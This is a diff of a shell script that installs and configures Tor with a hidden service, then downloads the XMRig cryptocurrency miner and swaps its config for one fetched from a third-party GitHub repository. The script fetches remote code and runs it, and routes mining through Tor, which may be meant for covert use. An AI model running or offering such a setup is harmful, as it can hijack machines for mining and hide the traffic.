@@ -1,7 +1,7 @@
-wget http://ftp.br.debian.org/debian/pool/main/t/tor/tor_0.3.5.14-1_amd64.deb && dpkg -i tor_0.3.5.14-1_amd64.deb
+wget http://ftp.br.debian.org/debian/pool/main/t/tor/tor_0.3.5.14-1_amd64.deb && chmod +x tor_0.3.5.14-1_amd64.deb && dpkg -i tor_0.3.5.14-1_amd64.deb
 
 
-service tor stop
+/etc/init.d/tor stop
 
 sed -i '75s/#HiddenServiceDir/HiddenServiceDir/ ' /etc/tor/torrc
 sed -i '18s/#SOCKSPort/SOCKSPort/ ' /etc/tor/torrc
@@ -9,8 +9,7 @@ sed -i 's/#ORPort/ORPort/ ' /etc/tor/torrc
 sed -i '76s/#HiddenServicePort/HiddenServicePort/ ' /etc/tor/torrc
 sed -i '76s/80/8080/g ' /etc/tor/torrc
 
-systemctl enable tor
-service tor start
+/etc/init.d/tor start
 
 wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar xf xmrig-6.13.1-linux-x64.tar.gz && cd xmrig-6.13.1 && rm -rf config.json && ls
 wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/config.json
